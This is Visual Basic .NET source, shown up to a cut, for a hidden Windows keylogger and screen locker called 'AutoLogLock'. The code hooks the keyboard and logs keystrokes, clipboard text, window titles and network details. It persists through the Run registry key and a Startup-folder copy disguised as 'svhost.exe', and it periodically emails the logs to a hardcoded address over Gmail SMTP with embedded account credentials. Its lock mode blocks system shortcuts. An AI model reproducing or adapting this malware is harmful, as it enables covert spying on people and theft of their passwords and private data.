#Region "Import Librarys"
'Option Strict On
Imports System.Environment
Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Text
Imports System.ComponentModel
Imports System.Net.Mail
Imports System.Xml
Imports System.IO.Compression
#End Region

Public Class Main_Form

#Region " Initial Declerations"

    ' PC info
    Dim pc_usr, pc_name, pc_screen, pc_osv, pc_runtime, pc_sysroot, pc_memtotal, pc_memremaining, pc_datetime, pc_Language, pc_lastRun, pc_os As String
    Dim pc_information, pc_lastActive As String
    Dim pc_logStart As String = DateTime.Now.ToString("MMMM dd, yyyy h:mm:ss tt")
    Dim appLoc As String = Application.ExecutablePath

    ' Timer
    Dim pc_totalSessionTimer As Integer
    Dim pc_totalSessionHrs As String
    Dim pc_totalSessionMins As String
    Dim pc_totalSessionSec As String

    ' Timer Auto Mail 30mins
    Dim autoSendMins As Integer = 0 ' in minutes : 00 meaning at the beginning and every 1 hour
    Dim autoSend As Boolean = True
    Dim autoSendTotal As Integer = 0

    ' Session
    Dim sessionDuration As String = "00:00:00"
    Dim overallSessionDays As Double
    Dim overallSessionHours As Double
    Dim overallSessionMins As Double
    Dim overallSessionSec As Double
    Dim overallSessionTime As String = "??:??:??"

    ' debuging
    Dim debugX As Boolean = False
    Dim ShowLogs As Boolean = True
    Dim FullScreen As Boolean = True
    Dim disableShortcutKeys As Boolean = False

    Dim HideMe As Boolean = True
    Dim CurrentStatus As String = "KeyLog" ' KeyLog or Lock
    Dim RegistryLocName As String = "SrvHost"
    Dim RegistryLocation As String = "HKEY_CURRENT_USER\" + RegistryLocName
    Dim currentClipBoard As String = ""

    Private secret As String = "Misi7hbx"

    ' keyboard_Class
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Private Declare Function ToUnicodeEx Lib "user32.dll" (ByVal wVirtKey As Keys, ByVal wScanCode As UInteger, ByVal lpKeyState() As Byte, ByVal pwszBuff As StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, ByVal dwhkl As IntPtr) As Integer
    Dim strinWT As String = Nothing
    Dim strinCB As String = Clipboard.GetText.ToString

    ' L O G
    Dim LastLogSent As String ' Sent or Unset
    Dim LogDir As String = GetFolderPath(SpecialFolder.ApplicationData) + String.Format("\SysLog\{0:yyyy-MMM-dd}", DateTime.Today) ' Log Directory
    Dim LogSysInfo As String = LogDir + "\System Information.txt"
    Dim LogWindowActivex As String = String.Format(LogDir + "\{0:MMM-dd-yyyy}_Active Window.txt", DateTime.Today)
    Dim LogClipBoardx As String = String.Format(LogDir + "\{0:MMM-dd-yyyy}_Clipboard Data.txt", DateTime.Today)
    Dim LogKeyPressx As String = String.Format(LogDir + "\{0:MMM-dd-yyyy}_Key Press.txt", DateTime.Today)
    Dim LogNetConnectionx As String = String.Format(LogDir + "\{0:MMM-dd-yyyy}_NetConnection.txt", DateTime.Today) ' network connection every app start only
    Dim LogAllError As String = String.Format(LogDir + "\{0:MMM-dd-yyyy}_System Errors.txt", DateTime.Today)

    ' Mail Credentials
    Dim mail_address As String = "admlnistratoxaccour@gmail.com"
    Dim mail_addName As String = "AutoLogLock Super Admin<" + mail_address + ">"
    Dim mail_passwd As String = "$abc@123$"
    Dim mail_recipients() As String = {"kyleian.c4@gmail.com"}
    Dim mail_subject As String
    Dim mail_body As String
    Dim mail_attachments As Net.Mail.Attachment
    Dim mail_to_attached() As String = {LogSysInfo, LogWindowActivex, LogClipBoardx, LogKeyPressx, LogNetConnectionx, LogAllError}
    Dim mail_isDelayed As Boolean = False

#End Region

    Private Sub Main_Form_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Opacity = 0
        Try
            ' Log Folder
            If Not Directory.Exists(LogDir) Then
                Directory.CreateDirectory(LogDir)
            End If
            ' run at start-up
            myClock.Start()
            upTimeStatusCheck.Start()
            Logger.Start()
            ConnectionInfo()
            PCinfo()
        Catch ex As Exception
            addError("Startup Functions Failed!", ex.ToString)
        End Try
        Try
            RegistryStatus()
            pc_logStart = My.Computer.Registry.GetValue(RegistryLocation, "Date Connected", Nothing).ToString
            CurrentStatus = My.Computer.Registry.GetValue(RegistryLocation, "Status", Nothing).ToString
            pc_lastActive = My.Computer.Registry.GetValue(RegistryLocation, "Last Active", Nothing).ToString
            LastLogSent = My.Computer.Registry.GetValue(RegistryLocation, "LogSent Status", Nothing).ToString
            overallSessionTime = pc_logStart.ToString
            If LastLogSent = "Unsent" Then
                mail_isDelayed = True
            End If
            SendMail(mail_isDelayed, "Session Start")
        Catch ex As Exception
            addError("Form Load Error", ex.ToString)
        End Try

        If debugX Then
            HideMe = False
        End If
    End Sub

    Private Sub Main_Form_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Me.Opacity = 0
        Me.TopMost = False

        Try ' Log Last Run on Exit
            Try : File.WriteAllText(LogSysInfo, pc_information) : Catch b As Exception : End Try
            My.Computer.Registry.SetValue(RegistryLocation, "Last Active", pc_datetime) ' Log History
            Catch ex As Exception
                addError("Adding Last Active Status Error", ex.ToString)
        End Try

        Try ' Send Log on Close
            If SendMail(mail_isDelayed, "Session Close") Then
                My.Computer.Registry.SetValue(RegistryLocation, "LogSent Status", "Sent") ' Sent
            Else
                My.Computer.Registry.SetValue(RegistryLocation, "LogSent Status", "Unsent") ' Unsent
            End If
        Catch x As Exception
            addError("Error Deleting Log Directory", x.ToString)
        End Try
    End Sub
    Private Sub myClock_Tick(sender As Object, e As EventArgs) Handles myClock.Tick
        Try
            pc_totalSessionTimer += 1
            Dim tmr As TimeSpan = TimeSpan.FromSeconds(pc_totalSessionTimer)
            pc_totalSessionHrs = tmr.ToString("hh")
            pc_totalSessionMins = tmr.ToString("mm")
            pc_totalSessionSec = tmr.ToString("ss")
            sessionDuration = pc_totalSessionHrs + ":" + pc_totalSessionMins + ":" + pc_totalSessionSec
            Label_TotalTime.Text = "Session Duration: " + sessionDuration
            ' Every X Time auto Mail
            If Int(tmr.Minutes) = autoSendMins And Int(tmr.Seconds) = 0 And autoSend Then
                autoSendTotal += 1
                SendMail(mail_isDelayed, "AutoMail " + autoSendTotal.ToString)
            End If
        Catch ex As Exception
            addError("Timer Encounter a Problem", ex.ToString)
        End Try
    End Sub

    Function GEToverallUserSession(toGet As String) As String
        Try
            Dim startrDate As DateTime = CDate(pc_logStart)
            Dim cxDate As String = Now.ToString("MMMM dd, yyyy h:mm:ss tt")
            Dim currentDate As DateTime = CDate(cxDate)
            ' date formulae
            Dim overallSession As TimeSpan = currentDate.Subtract(startrDate)
            overallSessionDays = overallSession.TotalDays
            overallSessionHours = overallSession.TotalHours
            overallSessionMins = overallSession.TotalMinutes
            overallSessionSec = overallSession.TotalSeconds

            Dim result As String = "Total Days: " + Int(overallSessionDays).ToString + vbNewLine
            result &= "Total Hours: " + Int(overallSessionHours).ToString + vbNewLine
            result &= "Total Minutes: " + Int(overallSessionMins).ToString + vbNewLine
            result &= "Total Seconds: " + Int(overallSessionSec).ToString
            Dim giveReturn As String = Nothing

            Dim tmr As TimeSpan = TimeSpan.FromSeconds(Convert.ToDouble(overallSessionSec))
            Dim h, m, s As String
            h = tmr.ToString("hh")
            m = tmr.ToString("mm")
            s = tmr.ToString("ss")

            overallSessionTime = h + ":" + m + ":" + s

            ' handle function return
            Select Case toGet
                Case "days"
                    giveReturn = Int(overallSessionDays).ToString
                Case "hours"
                    giveReturn = Int(overallSessionHours).ToString
                Case "minutes"
                    giveReturn = Int(overallSessionMins).ToString
                Case "seconds"
                    giveReturn = Int(overallSessionSec).ToString
                Case "formated"
                    giveReturn = overallSessionTime
                Case "alert"
                    MsgBox(result)
                Case "result"
                    giveReturn = result
                Case Else
                    giveReturn = Nothing
            End Select
            Return giveReturn
        Catch ex As Exception
            addError("Function Get Overall Session Failed", ex.ToString)
            Return Nothing
        End Try
    End Function

    Private Sub debugExit_Click(sender As Object, e As EventArgs) Handles debugExit.Click
        Me.Close()
    End Sub

#Region "Email Function"
    Public Function SendMail(ByVal isDelay As Boolean, ByVal sentID As String) As Boolean
        Dim addLine As String = "<hr size='1px' olor='#c0c0c0' />"
        Dim SendEmail As New MailMessage()
        Dim iDelay As String = ""
        Try
            SendEmail.From = New MailAddress(mail_addName)
            For i = 0 To mail_recipients.Length - 1
                SendEmail.To.Add(mail_recipients(i))
            Next
            If isDelay Then
                iDelay = " Delayed - "
            End If
            mail_subject = "[AutoLogLock] - " + iDelay + pc_usr + "@" + pc_name + " (" + pc_logStart + ")"
            SendEmail.Subject = mail_subject
            ' the B O D Y
            mail_body = "<b style='color: #900000;'>" + Application.ProductName + " v" + Application.ProductVersion + "</b><br />" +
                            "<small> App Location: <em>" + appLoc + "</em></small>" + addLine +
                            "Username: <b style='color: #900000;'>" + pc_usr + "</b><br />" +
                            "Computer Name: <b style='color: #900000;'>" + pc_name + "</b><br />" +
                            "OS: <b style='color: #900000;'>" + pc_os + "</b><br />" +
                            "Screen Resolution: <b style='color: #900000;'>" + pc_screen + "</b><br />" +
                            "OS Version: <b style='color: #900000;'>" + pc_osv + "</b><br />" +
                            "Runtime: <b style='color: #900000;'>" + pc_runtime + "</b><br />" +
                            "System Root: <b style='color: #900000;'>" + pc_sysroot + "</b><br />" +
                            "Total Physical Memory: <b style='color: #900000;'>" + pc_memtotal + "</b><br />" +
                            "Remaining Physical Memory: <b style='color: #900000;'>" + pc_memremaining + "</b><br />" +
                            "Session Start: <b style='color: #900000;'>" + pc_logStart.ToString + "</b><br />" +
                            "Last Active: <b style='color: #900000;'>" + pc_lastActive + "</b><br />" +
                            "System Date/Time: <b style='color: #900000;'>" + pc_datetime + "</b><br />" +
                            "PC Languages: <b style='color: #900000;'>" + pc_Language + "</b><br />" +
                            "Current Status: <b style='color: #900000;'>" + CurrentStatus + "</b><br />" +
                            "Session Duration: <b style='color: #900000;'>" + sessionDuration + "</b><br />" +
                            "Life Duration: <b style='color: #900000;'>" + overallSessionTime + "</b><br />" +
                            "Sent: <b style='color: #900000;'>" + sentID + "</b> <br /> " +
                            addLine + "<i style='color: #c0c0c0'><small>" + DateTime.Now.ToString("MMMM dd, yyyy @ h:mm:ss tt").ToString + "</small></i>"
            SendEmail.Body = mail_body
            SendEmail.IsBodyHtml = True
            ' adding log as attachment
            For i = 0 To mail_to_attached.Length - 1
                If File.Exists(mail_to_attached(i)) Then
                    Try
                        mail_attachments = New System.Net.Mail.Attachment(mail_to_attached(i))
                        SendEmail.Attachments.Add(mail_attachments) ' attached Log
                        If Not sentID = "Session Start" Then
                            Try : File.WriteAllText(mail_to_attached(i), Nothing) : Catch b As Exception : End Try
                        End If
                    Catch ex As Exception
                        addError("Add Attachment Erro '" + mail_to_attached(i) + "'", ex.ToString)
                    End Try
                End If
            Next
            ' S M T P
            Dim smtp As New SmtpClient("smtp.gmail.com")
            smtp.Port = 587
            smtp.EnableSsl = True
            smtp.Credentials = New System.Net.NetworkCredential(mail_address, mail_passwd)
            smtp.Send(SendEmail)
            Try
                My.Computer.Registry.SetValue(RegistryLocation, "LogSent Status", "Sent") ' If Last Log Sent
            Catch e As Exception
                addError("Sending Email Function Validator - Registry Failed!", e.ToString)
            End Try
            Return True
        Catch ex As Exception
            Try
                My.Computer.Registry.SetValue(RegistryLocation, "LogSent Status", "Unsent") ' If Last Log Not Sent
            Catch e As Exception
                addError("Sending Email Function Validator - Registry Failed!", ex.ToString)
            End Try
            addError("Sending Email Failed!", ex.ToString)
            Return False
        End Try
    End Function
#End Region

#Region "Password Form"
    Private Sub btn_Exit_Click(sender As Object, e As EventArgs) Handles btn_Exit.Click
        If secret_Key.Text = secret Then
            CurrentStatus = "KeyLog"
            Me.WindowState = FormWindowState.Minimized
            Me.Hide()
            HideMe = True
        ElseIf secret_Key.Text = "Syste.m" Then
            Me.Close()
        End If
        secret_Key.Text = Nothing
    End Sub

    Private Sub secret_Key_KeyDown(sender As Object, e As KeyEventArgs) Handles secret_Key.KeyDown
        If e.KeyCode = Keys.Enter Then
            btn_Exit.PerformClick()
        End If
    End Sub
#End Region

#Region "Timers Code"

#Region "Status Checker"
    ' Check if Always Top or Debuging mode
    Private Sub upTimeStatusCheck_Tick(sender As Object, e As EventArgs) Handles upTimeStatusCheck.Tick
        ' run custom function
        CheckStatus()
        AutoStart()
        PCinfo()
        ' Check Status Changes
        If Not CurrentStatus = My.Computer.Registry.GetValue(RegistryLocation, "Status", Nothing).ToString Then
            My.Computer.Registry.SetValue(RegistryLocation, "Status", CurrentStatus) ' Current Status Change
        End If
        If debugX Or ShowLogs Then
            logClipboard.Visible = True
            logWindowTitle.Visible = True
            logConnectionx.Visible = True
            keyStroke.Visible = True
            errLogs.Visible = True
        ElseIf debugX Then
            debugExit.Visible = True
            Panel1.BackColor = Color.DarkRed
        End If
        ' if Hidden
        If HideMe And Not CurrentStatus = "Lock" Then
            Me.Hide()
        ElseIf CurrentStatus = "Lock" Then
            HideMe = False
        End If
    End Sub

#End Region

#Region "Auto Logger"
    Private Sub Logger_Tick(sender As Object, e As EventArgs) Handles Logger.Tick
        GEToverallUserSession("run")
        ' Window Active Get Title
        Try
            If strinWT <> GetActiveWindowTitle() Then
                logWindowTitle.AppendText(vbNewLine + vbNewLine + GetActiveWindowTitle())
                Try : File.AppendAllText(LogWindowActivex, DateTime.Now.ToString("h:mm:ss tt") + vbTab + " - " + vbTab + GetActiveWindowTitle() + vbNewLine + vbNewLine) : Catch ex As Exception : End Try
                strinWT = GetActiveWindowTitle()
            End If
        Catch ex As Exception
            addError("Get Windows Title Error", ex.ToString)
        End Try
        ' Clipboard Content
        Try
            If Clipboard.ContainsText Then
                If strinCB <> currentClipBoard Then
                    logClipboard.AppendText(vbNewLine + vbNewLine + Clipboard.GetText.ToString + vbNewLine + vbNewLine + "- - - - - E N D - - - - -")
                    Try : File.AppendAllText(LogClipBoardx, "- - - - - S T A R T - - - - -" + vbNewLine + vbNewLine + Clipboard.GetText.ToString + vbNewLine + vbNewLine + "- - - E N D @ " + DateTime.Now.ToString("h:mm:ss tt") + " - - -" + vbNewLine + vbNewLine) : Catch ex As Exception : End Try
                    strinCB = Clipboard.GetText.ToString
                End If
                currentClipBoard = Clipboard.GetText.ToString
            End If
            Label_OverAllDuration.Text = "Life Duration: " + overallSessionTime
        Catch ex As Exception
            addError("Get Clipboard Data Error", ex.ToString)
        End Try
    End Sub
#End Region

#End Region

#Region "Top Dragable"
    Dim mouseX, mouseY As Integer

    Private Sub secret_Key_TextChanged(sender As Object, e As EventArgs) Handles secret_Key.TextChanged

    End Sub

    Dim dragable As Boolean

    Private Sub Panel1_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel1.MouseDown
        dragable = True
        mouseX = Cursor.Position.X - Me.Location.X
        mouseY = Cursor.Position.Y - Me.Location.Y
        If CurrentStatus = "KeyLog" Then
            Panel1.Cursor = Cursors.NoMove2D
        End If
    End Sub

    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        If dragable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub

    Private Sub Panel1_MouseUp(sender As Object, e As MouseEventArgs) Handles Panel1.MouseUp
        dragable = False
        Panel1.Cursor = Cursors.Default
    End Sub
#End Region

#Region "Custom Functions"
    Private Sub AutoStart()
        ' Check Auto Start Status
        Try
            Dim thisFile As String = Application.ExecutablePath
            Dim cpDist As String
            My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath) ' Registry
            If Directory.Exists("C:\Documents and Settings\") Then
                cpDist = "C:\Documents and Settings\" + Environment.UserName.ToString + "\Start Menu\Programs\Startup\svhost.exe" ' Windows XP
            Else
                cpDist = "C:\Users\" + Environment.UserName.ToString + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svhost.exe" ' Windows 7 and up
            End If
            If Not File.Exists(cpDist) Or Not CompareFiles(thisFile, cpDist) Then
                File.Copy(thisFile, cpDist, True)
            End If
        Catch ex As Exception
            addError("Error While Creating AutoStart", ex.ToString)
        End Try
    End Sub

    Private Sub RegistryStatus()
        Try
            ' Main Registry Key Check
            If My.Computer.Registry.CurrentUser.OpenSubKey(RegistryLocName) Is Nothing Then
                My.Computer.Registry.CurrentUser.CreateSubKey(RegistryLocName)
            End If
            ' Registry Date
            If My.Computer.Registry.GetValue(RegistryLocation, "Date Connected", Nothing) Is Nothing Then ' Date Connected DB
                My.Computer.Registry.SetValue(RegistryLocation, "Date Connected", pc_logStart.ToString)
            End If
            If My.Computer.Registry.GetValue(RegistryLocation, "Status", Nothing) Is Nothing Then ' KeyLog or Locker 
                My.Computer.Registry.SetValue(RegistryLocation, "Status", CurrentStatus) ' Default Status
            End If
            If My.Computer.Registry.GetValue(RegistryLocation, "Last Active", Nothing) Is Nothing Then ' Last Active 
                My.Computer.Registry.SetValue(RegistryLocation, "Last Active", pc_datetime) ' Log History
            End If
            If My.Computer.Registry.GetValue(RegistryLocation, "LogSent Status", Nothing) Is Nothing Then ' Last Active 
                My.Computer.Registry.SetValue(RegistryLocation, "LogSent Status", "Sent") ' Sent or Unsent
            End If
        Catch ex As Exception
            addError("Registry Error", ex.ToString)
        End Try
    End Sub

    Private Sub CheckStatus()
        If CurrentStatus = "KeyLog" Then
            FullScreen = False
            disableShortcutKeys = False
            If Me.TopMost Then
                Me.TopMost = False
            End If
            If Me.WindowState = System.Windows.Forms.FormWindowState.Maximized Then
                Me.WindowState = System.Windows.Forms.FormWindowState.Normal
            End If
        ElseIf CurrentStatus = "Lock" Then
            FullScreen = True
            disableShortcutKeys = True
            If Me.WindowState = System.Windows.Forms.FormWindowState.Minimized OrElse Me.WindowState = System.Windows.Forms.FormWindowState.Normal OrElse Me.TopMost = False Then
                Me.WindowState = System.Windows.Forms.FormWindowState.Maximized
                Me.Opacity = 100
                Me.TopMost = True
            End If
        End If
    End Sub

    Private Sub ConnectionInfo()
        ' Connection Info
        Try
            Dim myiProcess As New Process()
            myiProcess.StartInfo.UseShellExecute = False
            myiProcess.StartInfo.RedirectStandardOutput = True
            Dim result As String
            Try
                myiProcess.StartInfo.FileName = "ipconfig"
                myiProcess.StartInfo.Arguments = "/all"
                myiProcess.StartInfo.CreateNoWindow = True
                myiProcess.Start()
                result = Replace(myiProcess.StandardOutput.ReadToEnd(), Chr(13) & Chr(13), Chr(13))
                logConnectionx.AppendText(vbNewLine + vbNewLine + result)
                myiProcess.WaitForExit()

                Try : File.AppendAllText(LogNetConnectionx, "- - - - - S T A R T - - - - -" + vbNewLine + vbNewLine + result + vbNewLine + vbNewLine + "- - - E N D @ " + DateTime.Now.ToString("h:mm:ss tt") + " - - -" + vbNewLine + vbNewLine) : Catch ex As Exception : End Try
            Catch ex As Exception
                    addError("Second Try Failure *connection info", ex.ToString)
            End Try
        Catch ex As Exception
            addError("Failure *connection info", ex.ToString)
        End Try
    End Sub

    Private Function PCinfo() As String

        ' Computer info
        pc_usr = Environment.UserName.ToString
        pc_name = Environment.MachineName.ToString
        pc_os = getOSInfo()
        pc_screen = My.Computer.Screen.WorkingArea.ToString
        pc_osv = Environment.OSVersion.ToString
        pc_runtime = Environment.Version.ToString
        pc_sysroot = Environment.SystemDirectory.ToString
        pc_memtotal = Math.Round(My.Computer.Info.TotalPhysicalMemory / (1024 * 1024), 2).ToString + "MB"
        pc_memremaining = Math.Round(My.Computer.Info.AvailablePhysicalMemory / (1024 * 1024), 2).ToString + "MB"
        pc_datetime = Now.ToString("MMMM dd, yyyy h:mm:ss tt")
        For index = 0 To InputLanguage.InstalledInputLanguages.Count - 1 Step 1
            pc_Language = InputLanguage.InstalledInputLanguages.Item(index).LayoutName.ToString
        Next
        pc_Language &= " Keyboard"

        ' Displaying the Values
        LabelUname.Text = pc_usr
        LabelComName.Text = pc_name
        LabelScreen.Text = pc_screen
        LabelOS.Text = pc_os
        LabelOSv.Text = pc_osv
        LabelRunTime.Text = pc_runtime
        LabelSysRoot.Text = pc_sysroot
        LabelMemTotal.Text = pc_memtotal
        LabelMemRemaining.Text = pc_memremaining
        LabelDateTime.Text = pc_datetime
        LabelLang.Text = pc_Language

        ' Compile all Information
        pc_information = Application.ProductName + " v" + Application.ProductVersion + vbNewLine + vbNewLine +
            "Username: " + pc_usr + vbNewLine +
            "Computer Name: " + pc_name + vbNewLine +
            "OS: " + pc_os + vbNewLine +
            "Screen Resolution: " + pc_screen + vbNewLine +
            "OS Version: " + pc_osv + vbNewLine +
            "Runtime: " + pc_runtime + vbNewLine +
            "System Root: " + pc_sysroot + vbNewLine +
            "Total Physical Memory: " + pc_memtotal + vbNewLine +
            "Remaining Physical Memory: " + pc_memremaining + vbNewLine +
            "Session Start: " + pc_logStart.ToString + vbNewLine +
            "Last Active: " + pc_lastActive + vbNewLine +
            "System Date/Time: " + pc_datetime + vbNewLine +
            "PC Languages: " + pc_Language + vbNewLine +
            "Current Status: " + CurrentStatus + vbNewLine +
            "Session Duration: " + sessionDuration + vbNewLine +
            "Life Duration: " + overallSessionTime + vbNewLine +
            "App Location: " + appLoc
        Return pc_information

    End Function

    Public Function GetActiveWindowTitle() As String
        Dim MyStr As String = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function

    Private Sub addError(errorDisc As String, sysErr As String)
        Try
            errLogs.AppendText(vbNewLine + vbNewLine + ": " + errorDisc + " :" + vbNewLine + sysErr + vbNewLine + vbNewLine + "- - - - - + + + - - - - -")
            Try : File.AppendAllText(LogAllError, ": " + errorDisc + " :" + vbNewLine + sysErr + vbNewLine + vbNewLine + "- - - - - + + + - - - - -" + vbNewLine + vbNewLine) : Catch ex As Exception : End Try
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Get OS Function"
    Function getOSInfo() As String
        Dim OS = Environment.OSVersion
        Dim osVer = OS.Version
        Dim operatingSystem As String = ""
        If OS.Platform = PlatformID.Win32Windows Then
            Select Case osVer.Minor
                Case 0
                    operatingSystem = "95"
                Case 10
                    If osVer.Revision.ToString() = "2222A" Then
                        operatingSystem = "98SE"
                    Else
                        operatingSystem = "98"
                    End If
                Case 90
                    operatingSystem = "Me"
            End Select

        ElseIf OS.Platform = PlatformID.Win32NT Then
            Select Case osVer.Major
                Case 3
                    operatingSystem = "NT 3.51"
                Case 4
                    operatingSystem = "NT 4.0"
                Case 5
                    If (osVer.Minor = 0) Then
                        operatingSystem = "2000"
                    Else
                        operatingSystem = "XP"
                    End If
                Case 6
                    If (osVer.Minor = 0) Then
                        operatingSystem = "Vista"
                    ElseIf (osVer.Minor = 1) Then
                        operatingSystem = "7"
                    ElseIf (osVer.Minor = 2) Then
                        operatingSystem = "10"
                    Else
                        operatingSystem = "8.1"
                    End If
                Case 10
                    operatingSystem = "10"
            End Select
            If Not operatingSystem = "" Then
                operatingSystem = "Windows " + operatingSystem
                operatingSystem &= " " + OS.ServicePack
            End If
        End If

        Return operatingSystem

    End Function
#End Region

#Region "Function Compaire Files"
    Public Function CompareFiles(ByVal file1FullPath As String, ByVal file2FullPath As String) As Boolean

        If Not File.Exists(file1FullPath) Or Not File.Exists(file2FullPath) Then
            'One or both of the files does not exist.
            Return False
        End If

        If file1FullPath = file2FullPath Then
            ' fileFullPath1 and fileFullPath2 points to the same file...
            Return True
        End If

        Try
            Dim file1Hash As String = hashFile(file1FullPath)
            Dim file2Hash As String = hashFile(file2FullPath)

            If file1Hash = file2Hash Then
                Return True
            Else
                Return False
            End If

        Catch ex As Exception
            Return False
        End Try
    End Function

    Private Function hashFile(ByVal filepath As String) As String
        Using reader As New System.IO.FileStream(filepath, IO.FileMode.Open, IO.FileAccess.Read)
            Using md5 As New System.Security.Cryptography.MD5CryptoServiceProvider
                Dim hash() As Byte = md5.ComputeHash(reader)
                Return System.Text.Encoding.Unicode.GetString(hash)
            End Using
        End Using
    End Function
#End Region

#Region "Function - Keyboard"
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Public Sub New()
        Try
            Dim objCurrentModule As ProcessModule = Process.GetCurrentProcess().MainModule
            objKeyboardProcess = New LowLevelKeyboardProc(AddressOf captureKey)
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0)
            InitializeComponent()
        Catch ex As Exception

        End Try
    End Sub

    Private Structure KBDLLHOOKSTRUCT
        Public key As Keys
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public extra As IntPtr
    End Structure

    'System level functions to be used for hook and unhook keyboard input
    Public Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function SetWindowsHookEx(ByVal id As Integer, ByVal callback As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function UnhookWindowsHookEx(ByVal hook As IntPtr) As Boolean
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(ByVal hook As IntPtr, ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr
    End Function
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(ByVal name As String) As IntPtr
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function GetAsyncKeyState(ByVal key As Keys) As Short
    End Function

    'Declaring Global objects
    Private ptrHook As IntPtr
    Private objKeyboardProcess As LowLevelKeyboardProc

    Public Function Feed(ByVal e As Keys) As String
        Select Case e
            Case 65 To 90
                If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Return e.ToString
                Else
                    Return e.ToString.ToLower
                End If
            Case 48 To 57
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case e.ToString
                        Case "D1" : Return "!"
                        Case "D2" : Return "@"
                        Case "D3" : Return "#"
                        Case "D4" : Return "$"
                        Case "D5" : Return "%"
                        Case "D6" : Return "^"
                        Case "D7" : Return "&"
                        Case "D8" : Return "*"
                        Case "D9" : Return "("
                        Case "D0" : Return ")"
                    End Select
                Else
                    Return e.ToString.Replace("D", Nothing)
                End If
            Case 96 To 105
                Return e.ToString.Replace("NumPad", Nothing)
            Case 106 To 111
                Select Case e.ToString
                    Case "Divide" : Return "/"
                    Case "Multiply" : Return "*"
                    Case "Subtract" : Return "-"
                    Case "Add" : Return "+"
                    Case "Decimal" : Return "."
                End Select
            Case 32
                Return " "
            Case 186 To 222
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case e.ToString
                        Case "OemMinus" : Return "_"
                        Case "Oemplus" : Return "+"
                        Case "OemOpenBrackets" : Return "{"
                        Case "Oem6" : Return "}"
                        Case "Oem5" : Return "|"
                        Case "Oem1" : Return ":"
                        Case "Oem7" : Return """"
                        Case "Oemcomma" : Return "<"
                        Case "OemPeriod" : Return ">"
                        Case "OemQuestion" : Return "?"
                        Case "Oemtilde" : Return "~"
                    End Select
                Else
                    Select Case e.ToString
                        Case "OemMinus" : Return "-"
                        Case "Oemplus" : Return "="
                        Case "OemOpenBrackets" : Return "["
                        Case "Oem6" : Return "]"
                        Case "Oem5" : Return ""
                        Case "Oem1" : Return ";"
                        Case "Oem7" : Return "'"
                        Case "Oemcomma" : Return ","
                        Case "OemPeriod" : Return "."
                        Case "OemQuestion" : Return "/"
                        Case "Oemtilde" : Return "`"
                    End Select
                End If
            Case Keys.Return
                Return Environment.NewLine
            Case Else
                Return "<" + e.ToString + ">"
        End Select
        Return Nothing
    End Function

#End Region

#Region "Disabled Keys and Custom Shortcut Codes"
    Private Function captureKey(ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr
        Try
            If nCode >= 0 Then
                Dim objKeyInfo As KBDLLHOOKSTRUCT = DirectCast(Marshal.PtrToStructure(lp, GetType(KBDLLHOOKSTRUCT)), KBDLLHOOKSTRUCT)
                ' S T A R T shorcutDisabler
                If CBool(disableShortcutKeys) Then
                    If objKeyInfo.key = Keys.RWin OrElse objKeyInfo.key = Keys.LWin Then
                        ' Disabling Windows keys
                        Return CType(1, IntPtr)
                    End If
                    If My.Computer.Keyboard.CtrlKeyDown And objKeyInfo.key = Keys.Escape Then
                        ' Disabling Ctrl + Esc keys
                        Return CType(1, IntPtr)
                    End If
                    If My.Computer.Keyboard.AltKeyDown And objKeyInfo.key = Keys.Tab Then
                        ' Disabling Alt + Tab
                        Return CType(1, IntPtr)
                    End If
                    If objKeyInfo.key = Keys.F2 Then
                        ' Disabling F2
                        Return CType(1, IntPtr)
                    End If
                    ' E N D shorcutDisabler
                End If

                ' C U S T O M   S H O R T C U T   C O D E S

                ' Hidding for KeyLog Status
                If CurrentStatus = "KeyLog" Then
                    ' Show / Hide shortcut key
                    If objKeyInfo.key = Keys.N And My.Computer.Keyboard.CtrlKeyDown And My.Computer.Keyboard.AltKeyDown And My.Computer.Keyboard.ShiftKeyDown Then
                        Me.Show()
                        Me.TopMost = True
                        Me.TopMost = False
                        Me.Opacity = 100
                        Me.WindowState = FormWindowState.Normal
